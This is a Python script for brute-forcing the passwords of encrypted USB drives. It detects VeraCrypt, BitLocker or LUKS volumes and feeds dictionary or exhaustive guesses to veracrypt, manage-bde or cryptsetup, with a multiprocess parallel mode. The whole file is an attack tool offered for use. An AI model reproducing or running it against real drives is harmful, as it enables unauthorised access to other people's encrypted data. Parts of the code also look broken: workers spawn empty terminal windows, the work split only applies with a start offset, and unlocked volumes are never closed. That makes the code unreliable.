#!/usr/bin/env python3
import os
import sys
import subprocess
import itertools
import time
import platform
import threading
import string
import signal
from multiprocessing import Pool, cpu_count, Process, Queue, Value, Array
from queue import Empty

class USBPasswordBruteForcer:
    def __init__(self, drive_path, wordlist_path=None):
        self.drive_path = drive_path
        self.wordlist_path = wordlist_path
        self.attempts = 0
        self.found_password = None
        self.os_type = self.detect_os()
        self.stop_flag = None  # Will be set as a multiprocessing.Value for shared state
        self.setup_signal_handlers()
        
    def detect_os(self):
        """Detect the operating system"""
        return platform.system().lower()
    
    def setup_signal_handlers(self):
        """Setup signal handlers for graceful shutdown"""
        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)
    
    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\nReceived signal {signum}, shutting down gracefully...")
        if self.stop_flag is not None:
            self.stop_flag.value = True
    
    def open_cmd(self, process_id=0):
        """Open a command prompt window based on the OS"""
        if self.os_type == "windows":
            # For Windows, open a new CMD window with a title
            cmd = f'start "BruteForce Process {process_id}" cmd /k'
            subprocess.Popen(cmd, shell=True)
        elif self.os_type == "linux":
            # For Linux, open a new terminal window
            terminal_emulators = ["gnome-terminal", "konsole", "xterm", "xfce4-terminal"]
            for term in terminal_emulators:
                try:
                    if term == "gnome-terminal":
                        cmd = [term, "--title", f"BruteForce Process {process_id}", "--"]
                    elif term == "konsole":
                        cmd = [term, "--title", f"BruteForce Process {process_id}", "-e"]
                    else:
                        cmd = [term, "-title", f"BruteForce Process {process_id}", "-e"]
                    subprocess.Popen(cmd + ["bash"])
                    break
                except (FileNotFoundError, subprocess.SubprocessError):
                    continue
        elif self.os_type == "darwin":  # macOS
            # For macOS, open a new Terminal window
            applescript = f'''
            tell application "Terminal"
                do script "echo 'BruteForce Process {process_id}'"
                activate
            end tell
            '''
            subprocess.Popen(["osascript", "-e", applescript])
        else:
            print(f"Unsupported OS: {self.os_type}")
            return False
        return True
    
    def test_password(self, password):
        """Test if a password unlocks the USB drive"""
        if self.stop_flag is not None and self.stop_flag.value:
            return False
            
        try:
            # For VeraCrypt encrypted volumes
            if self.is_veracrypt_volume():
                result = subprocess.run(
                    ["veracrypt", "--non-interactive", "--text", 
                     "--password", password, "--mount", self.drive_path, "/tmp/mount"],
                    capture_output=True, text=True, timeout=5
                )
                return result.returncode == 0
                
            # For BitLocker encrypted drives (Windows)
            elif self.is_bitlocker_drive():
                result = subprocess.run(
                    ["manage-bde", "-unlock", self.drive_path, "-password", password],
                    capture_output=True, text=True, timeout=5
                )
                return result.returncode == 0
                
            # For LUKS encrypted drives (Linux)
            elif self.is_luks_volume():
                result = subprocess.run(
                    ["cryptsetup", "open", "--type", "luks", self.drive_path, 
                     "test_mount", "--key-file", "-"],
                    input=password.encode(), capture_output=True, timeout=5
                )
                return result.returncode == 0
                
            # Generic fallback - this is a placeholder and won't work for most encryption
            else:
                return False
                
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception):
            return False
    
    def is_veracrypt_volume(self):
        """Check if the drive is a VeraCrypt volume"""
        try:
            result = subprocess.run(
                ["file", self.drive_path],
                capture_output=True, text=True
            )
            return "VeraCrypt" in result.stdout
        except (FileNotFoundError, Exception):
            return False
    
    def is_bitlocker_drive(self):
        """Check if the drive is BitLocker encrypted"""
        try:
            result = subprocess.run(
                ["manage-bde", "-status", self.drive_path],
                capture_output=True, text=True
            )
            return result.returncode == 0
        except (FileNotFoundError, Exception):
            return False
    
    def is_luks_volume(self):
        """Check if the drive is a LUKS encrypted volume"""
        try:
            result = subprocess.run(
                ["cryptsetup", "isLuks", self.drive_path],
                capture_output=True, text=True
            )
            return result.returncode == 0
        except (FileNotFoundError, Exception):
            return False
    
    def dictionary_attack(self):
        """Perform a dictionary attack using a wordlist"""
        if not self.wordlist_path or not os.path.exists(self.wordlist_path):
            print(f"Wordlist not found: {self.wordlist_path}")
            return False
            
        print(f"Starting dictionary attack with {self.wordlist_path}")
        
        with open(self.wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                if self.stop_flag is not None and self.stop_flag.value:
                    break
                    
                password = line.strip()
                if not password:
                    continue
                    
                self.attempts += 1
                if self.test_password(password):
                    self.found_password = password
                    print(f"Password found: {password}")
                    return True
                    
                if self.attempts % 100 == 0:
                    print(f"Tested {self.attempts} passwords...")
                    
        return False
    
    def brute_force_attack(self, charset, min_length, max_length, start_char=None, start_num=None):
        """Perform a brute force attack with character set and length range"""
        print(f"Starting brute force attack with charset: {charset}")
        print(f"Testing passwords from length {min_length} to {max_length}")
        
        # If starting character and number are specified, adjust the charset and start point
        if start_char and start_num:
            print(f"Starting from character '{start_char}' with offset {start_num}")
            
        for length in range(min_length, max_length + 1):
            if self.stop_flag is not None and self.stop_flag.value:
                break
                
            print(f"Testing passwords of length {length}...")
            
            # Generate all possible combinations for this length
            combinations = itertools.product(charset, repeat=length)
            
            # If we have a starting point, skip to it
            if start_char and start_num and length == min_length:
                # Calculate the starting index based on the character and number
                start_index = charset.index(start_char) * (len(charset) ** (length-1)) + start_num
                for _ in range(start_index):
                    try:
                        next(combinations)
                    except StopIteration:
                        break
            
            for attempt in combinations:
                if self.stop_flag is not None and self.stop_flag.value:
                    break
                    
                password = ''.join(attempt)
                self.attempts += 1
                
                if self.test_password(password):
                    self.found_password = password
                    print(f"Password found: {password}")
                    return True
                    
                if self.attempts % 1000 == 0:
                    print(f"Tested {self.attempts} passwords...")
                    
        return False
    
    def worker_process(self, charset, min_length, max_length, start_char, start_num, 
                      process_id, result_queue, stop_flag, attempts_counter):
        """Worker process for parallel brute force attack"""
        # Open a new CMD window for this process
        self.open_cmd(process_id)
        
        # Create a new instance for this process
        local_forcer = USBPasswordBruteForcer(self.drive_path, self.wordlist_path)
        local_forcer.stop_flag = stop_flag
        
        # Calculate the starting point for this process
        if start_char and start_num:
            # Calculate the offset based on process_id to distribute the workload
            charset_size = len(charset)
            total_combinations = charset_size ** min_length
            processes = cpu_count()
            chunk_size = total_combinations // processes
            
            # Calculate the starting index for this process
            start_index = process_id * chunk_size
            
            # Convert the index back to a starting character and number
            adjusted_char_index = start_index // (charset_size ** (min_length-1)) % charset_size
            adjusted_char = charset[adjusted_char_index]
            adjusted_num = start_index % (charset_size ** (min_length-1))
        else:
            adjusted_char = None
            adjusted_num = None
            
        # Run the brute force attack
        success = local_forcer.brute_force_attack(charset, min_length, max_length, adjusted_char, adjusted_num)
        
        # If password was found, put it in the result queue
        if success:
            result_queue.put(local_forcer.found_password)
        
        # Update the attempts counter
        attempts_counter.value += local_forcer.attempts
        
        return success
    
    def parallel_brute_force(self, charset, min_length, max_length, processes=None, start_char=None, start_num=None):
        """Perform a parallel brute force attack using multiple processes"""
        if not processes:
            processes = cpu_count()
            
        print(f"Starting parallel brute force with {processes} processes")
        
        # Create shared variables for inter-process communication
        self.stop_flag = Value('b', False)
        result_queue = Queue()
        attempts_counter = Value('i', 0)
        
        # Create and start worker processes
        workers = []
        
        for i in range(processes):
            p = Process(
                target=self.worker_process,
                args=(charset, min_length, max_length, start_char, start_num, i, result_queue, self.stop_flag, attempts_counter)
            )
            p.start()
            workers.append(p)
        
        # Monitor the result queue for a found password
        found = False
        while any(p.is_alive() for p in workers) and not found:
            try:
                # Check for a found password
                found_password = result_queue.get(timeout=1)
                self.found_password = found_password
                print(f"Password found: {found_password}")
                found = True
                
                # Signal all workers to stop
                self.stop_flag.value = True
                
            except Empty:
                # No result yet, continue checking
                pass
        
        # Wait for all processes to finish
        for p in workers:
            p.join()
        
        # Update the total attempts
        self.attempts = attempts_counter.value
        
        return found
    
    def run(self, attack_type="dictionary", charset="abcdefghijklmnopqrstuvwxyz0123456789", 
            min_length=1, max_length=8, processes=None, start_char=None, start_num=None):
        """Run the brute force attack"""
        start_time = time.time()
        
        if attack_type == "dictionary":
            success = self.dictionary_attack()
        elif attack_type == "bruteforce":
            success = self.brute_force_attack(charset, min_length, max_length, start_char, start_num)
        elif attack_type == "parallel":
            success = self.parallel_brute_force(charset, min_length, max_length, processes, start_char, start_num)
        else:
            print(f"Unknown attack type: {attack_type}")
            return False
            
        elapsed_time = time.time() - start_time
        
        if success:
            print(f"Success! Password is: {self.found_password}")
            print(f"Found after {self.attempts} attempts in {elapsed_time:.2f} seconds")
            return True
        else:
            print(f"Failed to find password after {self.attempts} attempts in {elapsed_time:.2f} seconds")
            return False


